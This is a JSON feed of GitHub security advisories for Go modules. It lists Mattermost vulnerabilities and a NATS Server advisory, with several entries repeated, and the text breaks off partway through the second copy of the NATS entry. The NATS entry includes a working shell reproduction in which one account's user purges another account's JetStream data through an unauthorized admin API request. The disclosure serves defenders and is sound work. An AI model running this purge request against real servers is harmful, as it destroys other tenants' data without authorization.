{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>Mattermost Plugin MSTeams versions &lt;2.1.0 and Mattermost Server&nbsp;versions 10.5.x &lt;=10.5.1 with the MS Teams plugin enabled fail to perform constant time comparison on a MSTeams plugin webhook secret which allows&nbsp;an attacker to retrieve the webhook secret of the MSTeams plugin via a timing attack during webhook secret comparison.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27936\">https://nvd.nist.gov/vuln/detail/CVE-2025-27936</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2j87-p623-8cc2\">https://github.com/advisories/GHSA-2j87-p623-8cc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2j87-p623-8cc2",
            "title": "[github.com/mattermost/mattermost-plugin-msteams] Mattermost vulnerable to Observable Timing Discrepancy",
            "date_modified": "2025-04-16T14:58:56.000Z",
            "date_published": "2025-04-16T12:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2j87-p623-8cc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost Plugin MSTeams versions &lt;2.1.0 and Mattermost Server&nbsp;versions 10.5.x &lt;=10.5.1 with the MS Teams plugin enabled fail to perform constant time comparison on a MSTeams plugin webhook secret which allows&nbsp;an attacker to retrieve the webhook secret of the MSTeams plugin via a timing attack during webhook secret comparison.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27936\">https://nvd.nist.gov/vuln/detail/CVE-2025-27936</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2j87-p623-8cc2\">https://github.com/advisories/GHSA-2j87-p623-8cc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2j87-p623-8cc2",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to Observable Timing Discrepancy",
            "date_modified": "2025-04-16T14:58:56.000Z",
            "date_published": "2025-04-16T12:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2j87-p623-8cc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost Plugin MSTeams versions &lt;2.1.0 and Mattermost Server&nbsp;versions 10.5.x &lt;=10.5.1 with the MS Teams plugin enabled fail to perform constant time comparison on a MSTeams plugin webhook secret which allows&nbsp;an attacker to retrieve the webhook secret of the MSTeams plugin via a timing attack during webhook secret comparison.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27936\">https://nvd.nist.gov/vuln/detail/CVE-2025-27936</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2j87-p623-8cc2\">https://github.com/advisories/GHSA-2j87-p623-8cc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2j87-p623-8cc2",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to Observable Timing Discrepancy",
            "date_modified": "2025-04-16T14:58:56.000Z",
            "date_published": "2025-04-16T12:31:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2j87-p623-8cc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the \"Allow Users to View Archived Channels\" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27571\">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h4rr-f37j-4hh7\">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:53:27.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the \"Allow Users to View Archived Channels\" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27571\">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h4rr-f37j-4hh7\">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:53:27.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the \"Allow Users to View Archived Channels\" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27571\">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h4rr-f37j-4hh7\">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:53:27.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the \"Allow Users to View Archived Channels\" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27571\">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h4rr-f37j-4hh7\">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:53:27.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h4rr-f37j-4hh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 9.11.x &lt;= 9.11.9 fail to enforce MFA checks in PUT /api/v4/users/user-id/mfa when the requesting user differs from the target user ID, which allows users with edit_other_users permission to activate or deactivate MFA for other users, even if those users have not set up MFA.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27538\">https://nvd.nist.gov/vuln/detail/CVE-2025-27538</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j5jw-m2ph-3jjf\">https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j5jw-m2ph-3jjf",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Missing Authentication for Critical Function",
            "date_modified": "2025-04-16T14:52:37.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j5jw-m2ph-3jjf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 9.11.x &lt;= 9.11.9 fail to enforce MFA checks in PUT /api/v4/users/user-id/mfa when the requesting user differs from the target user ID, which allows users with edit_other_users permission to activate or deactivate MFA for other users, even if those users have not set up MFA.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27538\">https://nvd.nist.gov/vuln/detail/CVE-2025-27538</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j5jw-m2ph-3jjf\">https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j5jw-m2ph-3jjf",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Missing Authentication for Critical Function",
            "date_modified": "2025-04-16T14:52:37.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j5jw-m2ph-3jjf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 9.11.x &lt;= 9.11.9 fail to enforce MFA checks in PUT /api/v4/users/user-id/mfa when the requesting user differs from the target user ID, which allows users with edit_other_users permission to activate or deactivate MFA for other users, even if those users have not set up MFA.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27538\">https://nvd.nist.gov/vuln/detail/CVE-2025-27538</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j5jw-m2ph-3jjf\">https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j5jw-m2ph-3jjf",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Missing Authentication for Critical Function",
            "date_modified": "2025-04-16T14:52:37.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j5jw-m2ph-3jjf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24839\">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j639-m367-75cf\">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j639-m367-75cf",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:48:31.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j639-m367-75cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24839\">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j639-m367-75cf\">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j639-m367-75cf",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:48:31.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j639-m367-75cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24839\">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j639-m367-75cf\">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j639-m367-75cf",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:48:31.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j639-m367-75cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24839\">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j639-m367-75cf\">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j639-m367-75cf",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability",
            "date_modified": "2025-04-16T14:48:31.000Z",
            "date_published": "2025-04-16T09:32:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j639-m367-75cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"advisory\">Advisory</h2>\n<p>The management of JetStream assets happens with messages in the <code>$JS.</code> subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.</p>\n<p>Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<p>NATS Server:</p>\n<ul>\n<li>Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27</li>\n</ul>\n<hr>\n<h2 id=\"original-report\">Original Report</h2>\n<p>(Lightly edited to confirm some supposition and in the summary to use past tense)</p>\n<h3 id=\"summary\">Summary</h3>\n<p>nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.</p>\n<p>In all cases, APIs are not properly restricted to system-account users. Instead, <em>any</em> authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on <code>$JS.&gt;</code>.</p>\n<p>Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.</p>\n<p>Reproduction of the <code>ACCOUNT.PURGE</code> case is below. The others are like it.</p>\n<h3 id=\"details--impact\">Details &amp; Impact</h3>\n<h4 id=\"issue-1-jsapiaccountpurge\">Issue 1: <code>$JS.API.ACCOUNT.PURGE.*</code></h4>\n<p>Any user may perform an account purge of any other account (including their own).</p>\n<p>Risk: total destruction of Jetstream configuration and data.</p>\n<h4 id=\"issue-2-jsapiserverremove\">Issue 2: <code>$JS.API.SERVER.REMOVE</code></h4>\n<p>Any user may remove servers from Jetstream clusters.</p>\n<p>Risk: Loss of data redundancy, reduction of service quality.</p>\n<h4 id=\"issue-3-jsapiaccountstreammove-and-cancel_move\">Issue 3: <code>$JS.API.ACCOUNT.STREAM.MOVE.*.*</code> and <code>CANCEL_MOVE</code></h4>\n<p>Any user may cause streams to be moved between servers.</p>\n<p>Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.</p>\n<p>Similarly for <code>$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*</code></p>\n<h4 id=\"mitigations\">Mitigations</h4>\n<p>It appears that users without permission to publish on <code>$JS.API.ACCOUNT.&gt;</code> or <code>$JS.API.SERVER.&gt;</code> are unable to execute the above APIs.</p>\n<p>Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for <code>$JS.&gt;</code> (or simply <code>&gt;</code>), which allows the improper access to the system APIs above.</p>\n<h4 id=\"scope-of-impact\">Scope of impact</h4>\n<p>Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.</p>\n<p>While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.</p>\n<h4 id=\"additional-notes\">Additional notes</h4>\n<p>It appears that <code>$JS.API.META.LEADER.STEPDOWN</code> does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"environment\">Environment</h4>\n<p>Tested with:\nnats-server 2.10.26 (installed via homebrew)\nnats cli 0.1.6 (installed via homebrew)\nmacOS 13.7.4</p>\n<h4 id=\"reproduction-steps\">Reproduction steps</h4>\n<pre><code>$ nats-server --version\nnats-server: v2.10.26\n\n$ nats --version\n0.1.6\n\n$ cat nats-server.conf\nlisten: '0.0.0.0:4233'\njetstream: {\n  store_dir: './tmp'\n}\naccounts: {\n  '$SYS': {\n    users: [{user: 'sys', password: 'sys'}]\n  },\n  'TEST': {\n    jetstream: true,\n    users: [{user: 'a', password: 'a'}]\n  },\n  'TEST2': {\n    jetstream: true,\n    users: [{user: 'b', password: 'b'}]\n  }\n}\n\n$ nats-server -c ./nats-server.conf\n...\n[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf\n...\n[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233\n...\n\n# Authentication is effectively enabled by the server:\n$ nats -s nats://localhost:4233 account info\nnats: error: setup failed: nats: Authorization Violation\n\n$ nats -s nats://localhost:4233 account info --user sys --password wrong\nnats: error: setup failed: nats: Authorization Violation\n\n$ nats -s nats://localhost:4233 account info --user a --password wrong\nnats: error: setup failed: nats: Authorization Violation\n\n$ nats -s nats://localhost:4233 account info --user b --password wrong\nnats: error: setup failed: nats: Authorization Violation\n\n# Valid credentials work, and users properly matched to accounts:\n$ nats -s nats://localhost:4233 account info --user sys --password sys\nAccount Information\n                      User: sys\n                   Account: $SYS\n...\n\n$ nats -s nats://localhost:4233 account info --user a --password a\nAccount Information\n                           User: a\n                        Account: TEST\n...\n\n$ nats -s nats://localhost:4233 account info --user b --password b\nAccount Information\n                           User: b\n                        Account: TEST2\n...\n\n# Add a stream and messages to account TEST (user 'a'):\n$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults\nStream stream1 was created\n...\n\n$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 \"msg {{Count}}\"\n11:50:05 Published 5 bytes to \"s1\"\n11:50:05 Published 5 bytes to \"s1\"\n11:50:05 Published 5 bytes to \"s1\"\n\n# Messages are correctly persisted on account TEST, and not on TEST2:\n$ nats -s nats://localhost:4233 --user a --password a stream ls\n╭───────────────────────────────────────────────────────────────────────────────╮\n│                                    Streams                                    │\n├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤\n│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │\n├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤\n│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │\n╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯\n\n$ nats -s nats://localhost:4233 --user b --password b stream ls\nNo Streams defined\n\n$ du -h tmp/jetstream\n  0B\ttmp/jetstream/TEST/streams/stream1/obs\n8.0K\ttmp/jetstream/TEST/streams/stream1/msgs\n 16K\ttmp/jetstream/TEST/streams/stream1\n 16K\ttmp/jetstream/TEST/streams\n 16K\ttmp/jetstream/TEST\n 16K\ttmp/jetstream\n\n# User b (account TEST2) sends a PURGE command for account TEST (user a).\n# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.\n$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''\n11:54:50 Sending request on \"$JS.API.ACCOUNT.PURGE.TEST\"\n11:54:50 Received with rtt 1.528042ms\n{\"type\":\"io.nats.jetstream.api.v1.account_purge_response\",\"initiated\":true}\n\n# From nats-server in response to the purge request:\n[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)\n\n# And indeed, the stream data is gone on account TEST:\n$ du -h tmp/jetstream\n  0B\ttmp/jetstream\n\n$ nats -s nats://localhost:4233 --user a --password a stream ls\nNo Streams defined\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w\">https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w</a></li>\n<li><a href=\"https://advisories.nats.io/CVE/secnote-2025-01.txt\">https://advisories.nats.io/CVE/secnote-2025-01.txt</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30215\">https://nvd.nist.gov/vuln/detail/CVE-2025-30215</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/08/5\">http://www.openwall.com/lists/oss-security/2025/04/08/5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fhg8-qxh5-7q3w\">https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fhg8-qxh5-7q3w",
            "title": "[github.com/nats-io/nats-server/v2] NATS Server may fail to authorize certain Jetstream admin APIs",
            "date_modified": "2025-04-16T13:12:42.000Z",
            "date_published": "2025-04-15T21:45:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fhg8-qxh5-7q3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"advisory\">Advisory</h2>\n<p>The management of JetStream assets happens with messages in the <code>$JS.</code> subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.</p>\n<p>Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<p>NATS Server:</p>\n<ul>\n<li>Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27</li>\n</ul>\n<hr>\n<h2 id=\"original-report\">Original Report</h2>\n<p>(Lightly edited to confirm some supposition and in the summary to use past tense)</p>\n<h3 id=\"summary\">Summary</h3>\n<p>nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.</p>\n<p>In all cases, APIs are not properly restricted to system-account users. Instead, <em>any</em> authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on <code>$JS.&gt;</code>.</p>\n<p>Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.</p>\n<p>Reproduction of the <code>ACCOUNT.PURGE</code> case is below. The others are like it.</p>\n<h3 id=\"details--impact\">Details &amp; Impact</h3>\n<h4 id=\"issue-1-jsapiaccountpurge\">Issue 1: <code>$JS.API.ACCOUNT.PURGE.*</code></h4>\n<p>Any user may perform an account purge of any other account (including their own).</p>\n<p>Risk: total destruction of Jetstream configuration and data.</p>\n<h4 id=\"issue-2-jsapiserverremove\">Issue 2: <code>$JS.API.SERVER.REMOVE</code></h4>\n<p>Any user may remove servers from Jetstream clusters.</p>\n<p>Risk: Loss of data redundancy, reduction of service quality.</p>\n<h4 id=\"issue-3-jsapiaccountstreammove-and-cancel_move\">Issue 3: <code>$JS.API.ACCOUNT.STREAM.MOVE.*.*</code> and <code>CANCEL_MOVE</code></h4>\n<p>Any user may cause streams to be moved between servers.</p>\n<p>Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.</p>\n<p>Similarly for <code>$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*</code></p>\n<h4 id=\"mitigations\">Mitigations</h4>\n<p>It appears that users without permission to publish on <code>$JS.API.ACCOUNT.&gt;</code> or <code>$JS.API.SERVER.&gt;</code> are unable to execute the above APIs.</p>\n<p>Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for <code>$JS.&gt;</code> (or simply <code>&gt;</code>), which allows the improper access to the system APIs above.</p>\n<h4 id=\"scope-of-impact\">Scope of impact</h4>\n<p>Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.</p>\n<p>While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.</p>\n<h4 id=\"additional-notes\">Additional notes</h4>\n<p>It appears that <code>$JS.API.META.LEADER.STEPDOWN</code> does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"environment\">Environment</h4>\n<p>Tested with:\nnats-server 2.10.26 (installed via homebrew)\nnats cli 0.1.6 (installed via homebrew)\nmacOS 13.7.4</p>\n<h4 id=\"reproduction-steps\">Reproduction steps</h4>\n<pre><code>$ nats-server --version\nnats-server: v2.10.26\n\n$ nats --version\n0.1.6\n\n$ cat nats-server.conf\nlisten: '0.0.0.0:4233'\njetstream: {\n  store_dir: './tmp'\n}\naccounts: {\n  '$SYS': {\n    users: [{user: 'sys', password: 'sys'}]\n  },\n  'TEST': {\n    jetstream: true,\n    users: [{user: 'a', password: 'a'}]\n  },\n  'TEST2': {\n    jetstream: true,\n    users: [{user: 'b', password: 'b'}]\n  }\n}\n\n$ nats-server -c ./nats-server.conf\n...\n[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf\n...\n[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233\n...\n\n# Authentication is effectively enabled by the server:\n$ nats -s nats://localhost:4233 account info\nnats: error: setup failed: nats: Authorization Violation\n\n$ nats -s nats://localhost:4233 account info --user sys --password wrong\nnats: error: setup failed: nats: Authorization Violation\n\n$ nats -s nats://localhost:4233 account info --user a --password wrong\nnats: error: setup failed: nats: Authorization Violation\n\n$ nats -s nats://localhost:4233 account info --user b --password wrong\nnats: error: setup failed: nats: Authorization Violation\n\n# Valid credentials work, and users properly matched to accounts:\n$ nats -s nats://localhost:4233 account info --user sys --password sys\nAccount Information\n                      User: sys\n                   Account: $SYS\n...\n\n$ nats -s nats://localhost:4233 account info --user a --password a\nAccount Information\n                           User: a\n                        Account: TEST\n...\n\n$ nats -s nats://localhost:4233 account info --user b --password b\nAccount Information\n                           User: b\n                        Account: TEST2\n...\n\n# Add a stream and messages to account TEST (user 'a'):\n$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults\nStream stream1 was created\n...\n\n$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 \"msg {{Count}}\"\n11:50:05 Published 5 bytes to \"s1\"\n11:50:05 Published 5 bytes to 